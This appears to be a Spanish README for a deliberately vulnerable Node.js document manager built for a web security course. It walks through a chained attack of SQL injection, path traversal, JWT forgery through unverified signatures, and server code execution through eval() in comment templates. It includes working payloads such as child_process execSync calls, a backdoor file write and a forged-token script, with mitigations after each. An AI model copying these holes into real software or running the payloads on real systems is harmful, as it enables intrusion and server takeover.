# 📄 Gestor Docs G3

**Aplicación web para demostración de vulnerabilidades de seguridad**

---

## 🎯 **Descripción**


⚠️ **ADVERTENCIA**: Esta aplicación contiene vulnerabilidades de seguridad **intencionalmente implementadas** para fines educativos. **NUNCA** usar en producción.

---

## 🎯 **Flujo de Ataque**

Esta aplicación demuestra una **cadena de vulnerabilidades** que permite escalar privilegios desde usuario básico hasta control total del servidor:

### **📋 Pasos del Ataque:**

**1. 🔍 SQL Injection (Information Disclosure)**
- **Punto de entrada**: Login con usuario básico
- **Técnica**: Inyectar SQL malicioso para generar errores
- **Objetivo**: Obtener la ruta de la base de datos del error

**2. 📂 Path Traversal**  
- **Técnica**: Descargar la base de datos usando rutas relativas
- **Objetivo**: Acceder al archivo `g3.db` con todos los usuarios
- **Herramienta**: Abrir con DBeaver o DB Browser para SQLite

**3. 🎫 JWT Inseguro**
- **Técnica**: Modificar el token JWT en las cookies del navegador
- **Objetivo**: Cambiar el ID de usuario por el ID del admin
- **Explotación**: Backend no valida correctamente la integridad del token

**4. 💥 RCE (Remote Code Execution)**
- **Técnica**: Inyección de JavaScript en sistema de comentarios
- **Objetivo**: Ejecutar código arbitrario en el servidor
- **Escalación**: Control total del sistema

### **🎓 Objetivo Educativo:**
Demostrar cómo **múltiples vulnerabilidades aparentemente menores** pueden combinarse para lograr un **compromiso total del sistema**.

---


### **Estructura del proyecto:**
```
📁 backend/
  📁 api/          # Endpoints modularizados
    📄 auth.js     # Autenticación (VULNERABLE)
    📄 usuarios.js # Gestión usuarios (VULNERABLE)
    📄 documentos.js # Gestión archivos
    📄 comentarios.js # Sistema comentarios
  📁 db/           # Base de datos SQLite
  📁 files/        # Archivos PDF subidos
  📄 server.js     # Servidor Express principal

📁 frontend/
  📁 assets/       # CSS y recursos estáticos
  📁 components/   # Componentes reutilizables
  📁 pages/        # Páginas HTML

📄 init_db.js     # Script inicialización BD
📄 package.json   # Dependencias del proyecto
```

### **Tecnologías:**
- **Backend**: Node.js + Express
- **Base de datos**: SQLite3
- **Frontend**: HTML5 + CSS3 + JavaScript vanilla
- **Autenticación**: Sesiones con cookies
- **Subida archivos**: Multer

---

## 🚀 **Instalación y uso**

### **Requisitos previos:**
- Node.js 16+ 
- npm

### **Pasos de instalación:**

1. **Clonar el repositorio:**
```bash
git clone https://github.com/tu-usuario/segweb-g3-gestor-documentos.git
cd segweb-g3-gestor-documentos
```

2. **Instalar dependencias:**
```bash
npm install
```

3. **Inicializar base de datos:**
```bash
npm run initdb
```

4. **Ejecutar la aplicación:**
```bash
npm start
```

5. **Acceder a la aplicación:**
```
http://localhost:3000
```

### **Usuarios de prueba:**
| Usuario     | Contraseña  | Rol   |
|-------------|-------------|-------|
| admin       | admin123    | admin |
| user        | user123     | user  |
| manager     | manager123  | user  |
| guest       | guest123    | user  |
| superadmin  | super123    | admin |

---

## 🔴 **VULNERABILIDADES IMPLEMENTADAS**

> ⚠️ **Disclaimer**: Las siguientes vulnerabilidades están implementadas **únicamente para fines educativos**. El objetivo es aprender sobre seguridad web y técnicas de explotación en un entorno controlado.

### **1. 💉 SQL Injection**

#### **🎯 Ubicación:**
- **Login** (`/api/auth/login`)

#### **📝 Descripción:**
Las consultas SQL utilizan concatenación directa de strings sin sanitización, permitiendo inyección de código SQL malicioso.

#### **🔓 Código vulnerable:**
```javascript
// Login vulnerable
const query = `SELECT * FROM usuarios WHERE username = '${username}' AND password = '${password}'`;
```

#### **💀 Payloads de explotación:**

**Login bypass:**
```sql
Usuario: admin'--
Contraseña: cualquiera
```

#### **🛡️ Mitigación:**
Usar consultas parametrizadas:
```javascript
db.get('SELECT * FROM usuarios WHERE username = ? AND password = ?', [username, password], callback);
```

---

### **4. � Vulnerabilidades de autenticación clásicas**

#### **🎯 Ubicación:**
- Almacenamiento de contraseñas
- Gestión de sesiones (en implementaciones legacy)

#### **📝 Problemas identificados:**
- Contraseñas almacenadas en texto plano en la base de datos
- IDs de base de datos ahora son hashes impredecibles (mejorado)
- Sistema migrado a JWT (con vulnerabilidad propia)

#### **💀 Posibles explotaciones:**
- **Fuerza bruta** en contraseñas débiles
- **Exposición de contraseñas** en caso de compromiso de BD
- **Escalación de privilegios** vía manipulación de JWT (ver vulnerabilidad #4)

---

### **3. 🚨 Vulnerabilidad RCE (Remote Code Execution)**

#### **🎯 Ubicación:**
- Sistema de comentarios con plantillas dinámicas (`/api/comentarios`)

#### **📝 Descripción:**
El sistema de comentarios incluye una funcionalidad de **"referencias a usuarios"** que permite mencionar a otros usuarios que han interactuado con el documento. Los usuarios pueden usar variables como `{{uploader}}` para mencionar quien subió el archivo, `{{firstCommenter}}` para el primer comentarista, etc. Esta funcionalidad está implementada usando `eval()` para "flexibilidad", lo que permite la ejecución de código JavaScript arbitrario.

#### **🤔 ¿Por qué un desarrollador haría esto?**
Esta vulnerabilidad es **muy realista** porque:

**Solicitud simple de UX:**
- Los usuarios pidieron poder "mencionar" a otros usuarios en comentarios
- Era común escribir "Gracias Juan por subir esto" y querían automatizarlo
- El PM quería que fuera "dinámico" como `{{uploader}}` en lugar de texto fijo

**Decisión técnica aparentemente simple:**
- El desarrollador pensó: "Es solo reemplazar algunas variables, uso eval() para flexibilidad"
- Se consideró "funcionalidad básica" sin implicaciones de seguridad
- La lógica era: "solo admins comentan, es seguro"
- Deadline corto, se priorizó funcionalidad sobre seguridad

#### **🔓 Código vulnerable:**
```javascript
// Sistema de referencias a usuarios - VULNERABLE
let comentario = comentario.comentario;

// Referencias básicas (SEGURO)
comentario = comentario
  .replace(/\{\{uploader\}\}/g, uploader)
  .replace(/\{\{firstCommenter\}\}/g, firstCommenter)
  .replace(/\{\{previousCommenter\}\}/g, previousCommenter);

// CRÍTICO: Procesar "referencias avanzadas" (VULNERABLE)
if (comentario.includes('{{') && comentario.includes('}}')) {
  comentario = comentario.replace(/\{\{([^}]+)\}\}/g, (match, ref) => {
    // VULNERABILIDAD: eval() para "flexibilidad de referencias"
    return eval(ref); // ¡Ejecuta cualquier código JavaScript!
  });
}
```

#### **💀 Explotación paso a paso:**

**Requisito:** Acceso como admin (solo admins pueden comentar)

**Paso 1: Iniciar sesión como admin**
- Usuario: `admin`
- Contraseña: `admin123`

**Paso 2: Ir a "Ver documentos"**
- Seleccionar cualquier archivo PDF
- Observar las instrucciones de plantillas dinámicas

**Paso 3: Explotar usando expresiones "matemáticas"**
- En lugar de un comentario normal, inyectar código malicioso

#### **💀 Payloads sutiles (disfrazados como referencias de usuarios):**

**Ejemplo 1: "Información del usuario del servidor" (reconocimiento)**
```
Gracias {{uploader}} por subirlo. Info técnica: {{process.platform}} {{process.version}}
```

**Ejemplo 2: "Validación del proceso" (identificación del usuario del servidor)**
```
Respondo a {{previousCommenter}} - Proceso verificado por: {{require('child_process').execSync('whoami').toString().trim()}}
```

**Ejemplo 3: "Listado de archivos relacionados" (enumeración)**
```
Como dice {{firstCommenter}}, archivos relacionados: {{require('fs').readdirSync('.').slice(0,3).join(', ')}}
```

**Ejemplo 4: "Log de actividad" (creación de evidencia)**
```
Seguimiento para {{uploader}}: {{require('fs').writeFileSync('activity.log', 'User accessed file: ' + new Date())}} ✓ Registrado
```

**Ejemplo 5: "Script de mantenimiento" (backdoor sutil)**
```
{{uploader}} necesita verificar esto: {{require('fs').writeFileSync('maint.bat', '@echo off\\necho Sistema OK\\nwhoami\\nhostname\\ndir')}}, ejecutando {{require('child_process').exec('maint.bat')}} ✓
```

#### **🎭 ¿Por qué estos payloads son especialmente sutiles?**

1. **Contexto conversacional**: Parecen respuestas normales a otros usuarios
2. **Referencias legítimas**: Usan las variables correctas como `{{uploader}}`, `{{previousCommenter}}`
3. **Flujo natural**: Se leen como comentarios reales de trabajo
4. **Justificación técnica**: Las "verificaciones" parecen parte del proceso normal
5. **Camuflaje perfecto**: Un admin usaría esto pensando que está mencionando usuarios

**Ejemplo real de ataque encubierto:**
```
Hola {{uploader}}, gracias por subir este documento importante.
{{previousCommenter}} tenía razón sobre la verificación.
Proceso completado: {{require('child_process').exec('powershell -c "Get-Process | Out-File processes.txt"')}} ✓
Sistema validado para {{firstCommenter}}: {{require('fs').writeFileSync('c:/temp/access.log', 'SYSTEM_ACCESS_' + Date.now())}} ✓
```

Este comentario parece una conversación normal pero ejecuta comandos maliciosos.
#### **🛡️ Mitigación:**
```javascript
// NUNCA usar eval() con datos de usuario
// Implementar plantillas de forma segura usando whitelist
function procesarPlantillasSeguras(comentario, usuario, archivo) {
  // Solo variables predefinidas y controladas
  const variables = {
    username: usuario.username,
    fecha: new Date().toLocaleDateString('es-ES'),
    archivo: archivo,
    autor: usuario.username
  };
  
  // Reemplazar solo variables permitidas
  let procesado = comentario;
  Object.keys(variables).forEach(key => {
    const regex = new RegExp(`\\{\\{${key}\\}\\}`, 'g');
    procesado = procesado.replace(regex, variables[key]);
  });
  
  // Para expresiones matemáticas, usar un evaluador seguro
  // como math.js en lugar de eval()
  return procesado;
}
```

---

### **5. 📂 Vulnerabilidades de subida de archivos**

#### **🎯 Ubicación:**
- Endpoint `/api/documentos/upload`

#### **📝 Problemas identificados:**
- Validación solo por MIME type (bypasseable)
- No hay validación de contenido del archivo
- Archivos almacenados con nombre original
- Falta límite de tasa de subida

#### **💀 Posibles explotaciones:**
- Subir archivos maliciosos con extensión PDF
- Path traversal en nombres de archivo
- DoS por subida masiva de archivos

---

### **6. 🌐 Exposición de información**

#### **🎯 Ubicación:**
- Búsqueda de usuarios devuelve contraseñas
- Logs del servidor muestran consultas SQL
- Errores de BD expuestos al frontend

#### **💀 Información expuesta:**
- Contraseñas en texto plano
- Estructura de la base de datos
- Detalles técnicos en errores

---

### **7. 🔓 Vulnerabilidad JWT (JSON Web Token)**

#### **🎯 Ubicación:**
- Sistema de autenticación (`/backend/utils/jwt.js`)
- Middlewares de autenticación en todos los endpoints protegidos

#### **📝 Descripción:**
El sistema utiliza JWT para autenticación, pero la función de verificación tiene una vulnerabilidad crítica: **no verifica la firma del token**. Solo decodifica el JWT y verifica la estructura básica, permitiendo que tokens maliciosos sean aceptados como válidos.

#### **🔓 Código vulnerable:**
```javascript
// VULNERABILIDAD CRÍTICA: Verificación defectuosa del JWT
function verifyToken(token) {
  try {
    // VULNERABILIDAD: Decodifica sin verificar la firma
    const decoded = jwt.decode(token, { complete: true });
    
    if (!decoded || !decoded.payload) {
      return null;
    }
    
    // Solo verifica que tenga la estructura correcta, NO la firma
    const payload = decoded.payload;
    
    // Verificación básica de campos requeridos
    if (!payload.id || !payload.username || !payload.rol) {
      return null;
    }
    
    // Verificar expiración (esta parte sí funciona)
    if (payload.exp && payload.exp < Math.floor(Date.now() / 1000)) {
      return null; // Token expirado
    }
    
    return payload; // ⚠️ ACEPTA CUALQUIER TOKEN CON ESTRUCTURA CORRECTA
  } catch (error) {
    return null;
  }
}
```

#### **💀 Explotación paso a paso:**

**Paso 1: Obtener un token válido**
- Hacer login legítimo con cualquier usuario (ej: `user/user123`)
- Capturar el JWT desde localStorage o desde las herramientas de desarrollo

**Paso 2: Decodificar y modificar el token**
- Usar herramientas como jwt.io para decodificar el token
- Modificar el payload, por ejemplo cambiar `"rol": "user"` a `"rol": "admin"`
- Cambiar el `username` si se desea

**Paso 3: Crear token malicioso**
- Generar un nuevo JWT con el payload modificado
- **No importa la firma** ya que no se verifica

**Paso 4: Usar el token falsificado**
- Reemplazar el token en localStorage/sessionStorage
- O enviarlo en el header Authorization: `Bearer TOKEN_FALSO`

#### **💀 Ejemplos de explotación:**

**Ejemplo 1: Escalación de privilegios a admin**
```javascript
// Token original decodificado:
{
  "id": "abc123...",
  "username": "user",
  "rol": "user",
  "iat": 1640995200,
  "exp": 1641081600
}

// Token malicioso (cambiar rol a admin):
{
  "id": "abc123...",
  "username": "user", 
  "rol": "admin",  // ⚠️ ESCALACIÓN DE PRIVILEGIOS
  "iat": 1640995200,
  "exp": 1641081600
}
```

**Ejemplo 2: Suplantación de identidad**
```javascript
// Crear token como superadmin sin conocer sus credenciales:
{
  "id": "fake-id-123",
  "username": "superadmin",
  "rol": "admin",
  "iat": 1640995200,
  "exp": 2147483647  // Expiración muy lejana
}
```

**Ejemplo 3: Bypass de autenticación**
```javascript
// Token completamente falso pero con estructura correcta:
{
  "id": "hacker-id",
  "username": "hacker",
  "rol": "admin",
  "iat": 1640995200,
  "exp": 2147483647
}
```

#### **🔍 Herramientas para explotar:**

**Usando jwt.io:**
1. Pegar el token original en jwt.io
2. Modificar el payload en la sección derecha
3. Copiar el nuevo token (ignorar la advertencia de "signature invalid")
4. Usar el token modificado en la aplicación

**Usando código JavaScript:**
```javascript
// Crear token falso sin verificación de firma
const fakePayload = {
  id: "fake-id",
  username: "admin",
  rol: "admin",
  iat: Math.floor(Date.now() / 1000),
  exp: Math.floor(Date.now() / 1000) + (60 * 60 * 24 * 365) // 1 año
};

// Crear JWT falso (header + payload + firma_falsa)
const header = btoa(JSON.stringify({typ: "JWT", alg: "HS256"}));
const payload = btoa(JSON.stringify(fakePayload));
const fakeToken = header + "." + payload + ".fake_signature";

// Usar en localStorage
localStorage.setItem('jwt_token', fakeToken);
```

#### **🛡️ Mitigación:**
```javascript
// Función CORRECTA para verificar JWT
function verifyTokenCorrectly(token) {
  try {
    // ✅ USAR jwt.verify() que SÍ verifica la firma
    return jwt.verify(token, JWT_SECRET);
  } catch (error) {
    return null;
  }
}
```

---

## 🔄 **CAMBIOS Y MEJORAS RECIENTES**

### **Migración a JWT y nuevas vulnerabilidades**

#### **✅ Mejoras implementadas:**
- **IDs hash impredecibles**: Los usuarios y comentarios ahora usan IDs hash criptográficos en lugar de IDs numéricos secuenciales
- **Autenticación JWT**: Sistema migrado de sesiones en memoria a JSON Web Tokens
- **Frontend modularizado**: Gestión de autenticación centralizada con `AuthManager`
- **Mejor UX**: Manejo de tokens tanto en localStorage como sessionStorage según preferencia del usuario

#### **🚨 Nueva vulnerabilidad crítica agregada:**
- **Verificación JWT defectuosa**: La función `verifyToken()` no verifica la firma, permitiendo tokens falsificados
- **Escalación de privilegios**: Posible bypass completo de autenticación y escalación a admin
- **Herramientas de explotación**: Documentados métodos con jwt.io y código JavaScript

#### **🎯 Objetivos educativos:**
Esta aplicación ahora contiene **7 vulnerabilidades diferentes** que cubren:
- **Injection**: SQLi en login y búsqueda de usuarios
- **Broken Authentication**: JWT sin verificación de firma
- **Sensitive Data Exposure**: Contraseñas en texto plano, información de usuarios
- **Security Misconfiguration**: Plantillas vulnerables, validación deficiente
- **Remote Code Execution**: JavaScript injection en comentarios
- **File Upload**: Validación bypasseable de archivos

#### **📚 Valor educativo:**
- Ejemplos **realistas** de vulnerabilidades comunes en aplicaciones web modernas
- **Código vulnerable** documentado con explicaciones técnicas
- **Payloads funcionales** para practicar técnicas de penetration testing
- **Mitigaciones correctas** para aprender buenas prácticas de seguridad

---

## 🎯 **TUTORIAL: CADENA COMPLETA DE ATAQUE**

### **💡 Escenario: De usuario básico a control total del servidor**

Este tutorial demuestra cómo **combinar múltiples vulnerabilidades** para escalar privilegios de forma realista:

---

### **PASO 1: 🔍 SQL Injection - Information Disclosure**

**Objetivo**: Obtener información sensible del sistema mediante errores SQL

**Procedimiento**:
1. Ir a `/login`
2. Usar usuario básico: `user` / `user123`
3. Interceptar la petición de login y modificar el username:
   ```
   Username: admin' OR '1'='1' UNION SELECT * FROM sqlite_master--
   ```
4. **Resultado**: Error SQL que expone:
   - Ruta de la base de datos: `backend/files/db/g3.db`
   - Estructura interna del servidor
   - Información de configuración

---

### **PASO 2: 📂 Path Traversal - Acceso a la Base de Datos**

**Objetivo**: Descargar la base de datos para análisis offline

**Procedimiento**:
1. Usar la ruta obtenida en el paso anterior
2. Acceder a: `/files/db/g3.db` o usar path traversal como `../files/db/g3.db`
3. Descargar el archivo `g3.db`
4. **Abrir con DBeaver o DB Browser for SQLite**
5. **Resultado**: Acceso a tabla `usuarios` con:
   - IDs de usuarios: `bdd96704ad0ad17e4cff8864e43a1686` (admin)
   - Usernames: `admin`, `user`
   - Contraseñas hasheadas (no útiles directamente)

---

### **PASO 3: 🎫 JWT Inseguro - Escalación de Privilegios**

**Objetivo**: Modificar el token JWT para obtener privilegios de admin

**Procedimiento**:
1. Hacer login con usuario básico (`user` / `user123`)
2. Abrir **Developer Tools** → **Application** → **Cookies**
3. Encontrar el token JWT en las cookies
4. **Decodificar el JWT** (usar jwt.io):
   ```json
   {
     "id": "id_del_usuario_basico",
     "username": "user",
     "rol": "user"
   }
   ```
5. **Modificar el payload**:
   ```json
   {
     "id": "bdd96704ad0ad17e4cff8864e43a1686",
     "username": "admin", 
     "rol": "admin"
   }
   ```
6. **Generar nuevo JWT** con la misma clave (o sin verificación)
7. **Reemplazar cookie** en el navegador
8. **Resultado**: Acceso como administrador

---

### **PASO 4: 💥 RCE - Ejecución Remota de Código**

**Objetivo**: Ejecutar código arbitrario en el servidor mediante comentarios

**Procedimiento**:
1. Con privilegios de admin, ir a **"Ver documentos"**
2. Seleccionar cualquier archivo PDF
3. En el sistema de comentarios, usar referencias con código malicioso:
   ```javascript
   Hola {{uploader}}, info del servidor: {{process.platform}} {{process.version}}
   ```
4. **Escalación a RCE completo**:
   ```javascript
   {{require('child_process').execSync('whoami').toString()}}
   ```
5. **Crear backdoor**:
   ```javascript
   {{require('fs').writeFileSync('backdoor.js', 'console.log("Server compromised!")')}}
   ```

---

### **🎯 RESULTADO FINAL**
- ✅ **Información sensible** obtenida via SQL Injection
- ✅ **Base de datos** descargada via Path Traversal  
- ✅ **Privilegios de admin** obtenidos via JWT manipulation
- ✅ **Control total del servidor** via RCE en comentarios

### **📚 LECCIONES APRENDIDAS**
1. **Múltiples vulnerabilidades menores** pueden combinarse para ataques devastadores
2. **Information Disclosure** en errores puede exponer infraestructura crítica
3. **Tokens inseguros** permiten escalación trivial de privilegios
4. **Input validation** insuficiente en funcionalidades "seguras" puede ser explotado

---


